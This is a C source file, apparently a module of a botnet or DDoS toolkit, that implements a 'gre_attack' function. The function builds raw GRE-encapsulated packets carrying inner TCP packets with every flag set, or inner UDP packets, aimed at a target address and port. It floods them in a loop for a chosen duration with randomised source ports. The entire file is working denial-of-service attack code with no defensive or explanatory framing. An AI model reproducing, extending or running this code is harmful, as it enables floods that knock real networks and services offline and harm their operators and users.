#define _GNU_SOURCE

#include "headers/gre_attack.h"
#include "headers/checksum.h"
#include <sys/socket.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <errno.h>
#include <time.h>

struct grehdr {
    unsigned short flags;
    unsigned short protocol;
    unsigned short checksum;
    unsigned short reserved;
};

void* gre_attack(void* arg) {
    gre_attack_params* params = (gre_attack_params*)arg;
    if (!params) return NULL;

    int proto = IPPROTO_IP;
    if (params->gre_proto == 1) proto = IPPROTO_TCP;
    else if (params->gre_proto == 2) proto = IPPROTO_UDP;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_GRE);
    if (sock < 0) return NULL;

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        close(sock);
        return NULL;
    }
    
    const size_t ip_size = sizeof(struct iphdr);
    const size_t gre_size = sizeof(struct grehdr);
    const size_t tcp_size = sizeof(struct tcphdr);
    const size_t udp_size = sizeof(struct udphdr);
    
    size_t min_size = ip_size + gre_size + ip_size;  // Outer IP + GRE + Inner IP
    if (proto == IPPROTO_TCP) min_size += tcp_size;
    else if (proto == IPPROTO_UDP) min_size += udp_size;
    
    size_t packet_size = params->psize > 0 ? (size_t)params->psize : min_size;
    if (packet_size < min_size) packet_size = min_size;
    if (packet_size > 8192) packet_size = 8192;

    unsigned char *packet = calloc(1, packet_size);
    if (!packet) {
        close(sock);
        return NULL;
    }

    struct iphdr *iph = (struct iphdr*)packet;
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons((uint16_t)packet_size);
    iph->id = htons(getpid() & 0xFFFF);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_GRE;
    iph->check = 0;
    iph->saddr = INADDR_ANY;
    iph->daddr = params->target_addr.sin_addr.s_addr;

    struct grehdr *greh = (struct grehdr*)(packet + ip_size);
    greh->flags = htons(0x2000);
    greh->protocol = htons(0x0800);

    unsigned char *inner_packet = packet + ip_size + gre_size;
    struct iphdr *inner_iph = (struct iphdr*)inner_packet;
    inner_iph->ihl = 5;
    inner_iph->version = 4;
    inner_iph->tos = 0;
    inner_iph->tot_len = htons((uint16_t)(packet_size - ip_size - gre_size));
    inner_iph->id = htons((getpid() + 1) & 0xFFFF);
    inner_iph->frag_off = 0;
    inner_iph->ttl = 64;
    inner_iph->protocol = proto;
    inner_iph->check = 0;
    inner_iph->saddr = INADDR_ANY;
    inner_iph->daddr = params->target_addr.sin_addr.s_addr;

    uint16_t src_port = params->srcport > 0 ? (uint16_t)params->srcport : (uint16_t)(rand() % 0xFFFF);
    
    if (proto == IPPROTO_TCP) {
        struct tcphdr *tcph = (struct tcphdr*)(inner_packet + ip_size);
        if ((size_t)((unsigned char*)tcph + tcp_size - packet) > packet_size) {
            free(packet);
            close(sock);
            return NULL;
        }
        tcph->source = htons(src_port);
        tcph->dest = params->target_addr.sin_port;
        tcph->seq = 0;
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->fin = 1;
        tcph->syn = 1;
        tcph->rst = 1;
        tcph->psh = 1;
        tcph->ack = 1;
        tcph->urg = 1;
        tcph->window = htons(16384);
        tcph->check = 0;
        tcph->urg_ptr = 0;
    } else if (proto == IPPROTO_UDP) {
        struct udphdr *udph = (struct udphdr*)(inner_packet + ip_size);
        if ((size_t)((unsigned char*)udph + udp_size - packet) > packet_size) {
            free(packet);
            close(sock);
            return NULL;
        }
        udph->source = htons(src_port);
        udph->dest = params->target_addr.sin_port;
        udph->len = htons((uint16_t)(packet_size - ip_size - gre_size - ip_size));
        udph->check = 0;
    }

    time_t end_time = time(NULL) + params->duration;
    while (params->active && time(NULL) < end_time) {
        iph->id = htons(getpid() & 0xFFFF);
        inner_iph->id = htons((getpid() + 1) & 0xFFFF);

        uint16_t src_port = params->srcport > 0 ? (uint16_t)params->srcport : (uint16_t)(rand() % 0xFFFF);
        if (proto == IPPROTO_TCP) {
            struct tcphdr *tcph = (struct tcphdr*)(inner_packet + ip_size);
            size_t min_tcp_size = ip_size + gre_size + ip_size + tcp_size;
            if ((size_t)((unsigned char*)tcph + tcp_size - packet) > packet_size || packet_size < min_tcp_size) {
                break;
            }
            tcph->source = htons(src_port);
            tcph->seq = 0;
            tcph->check = 0;
            tcph->check = tcp_udp_checksum(tcph, 
                                         (size_t)(ntohs(inner_iph->tot_len) - ip_size),
                                         inner_iph->saddr, inner_iph->daddr, IPPROTO_TCP);
        } else if (proto == IPPROTO_UDP) {
            struct udphdr *udph = (struct udphdr*)(inner_packet + ip_size);
            size_t min_udp_size = ip_size + gre_size + ip_size + udp_size;
            if ((size_t)((unsigned char*)udph + udp_size - packet) > packet_size || packet_size < min_udp_size) {
                break;
            }
            udph->source = htons(src_port);
            udph->check = 0;
            udph->check = tcp_udp_checksum(udph, 
                                         (size_t)(ntohs(inner_iph->tot_len) - ip_size),
                                         inner_iph->saddr, inner_iph->daddr, IPPROTO_UDP);
        }

        if (packet_size < ip_size + gre_size + ip_size) {
            break;
        }

        inner_iph->check = 0;
        inner_iph->check = generic_checksum(inner_iph, ip_size);
        
        greh->checksum = 0;
        greh->reserved = 0;
        greh->checksum = generic_checksum(greh, packet_size - ip_size);

        iph->check = 0;
        iph->check = generic_checksum(iph, ip_size);

        sendto(sock, packet, packet_size, 0, 
                  (struct sockaddr*)&params->target_addr, sizeof(params->target_addr));
    }

    free(packet);
    close(sock);
    params->active = 0;
    return (void*)1;
}
